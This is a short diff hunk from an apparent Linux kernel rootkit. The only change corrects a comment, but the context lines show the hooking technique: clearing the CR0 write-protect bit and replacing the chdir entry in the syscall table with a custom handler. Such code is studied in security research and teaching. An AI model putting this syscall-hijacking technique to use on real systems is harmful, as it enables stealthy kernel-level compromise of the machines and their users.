@@ -67,7 +67,7 @@ int rootkit_init(void)
 	// make writable by disabling write protect
 	write_cr0(read_cr0() & (~0x10000));
 
-	// hijack write system call
+	// hijack chdir system call
 	original_chdir = syscall_table[__NR_chdir];
 	syscall_table[__NR_chdir] = my_chdir;
 
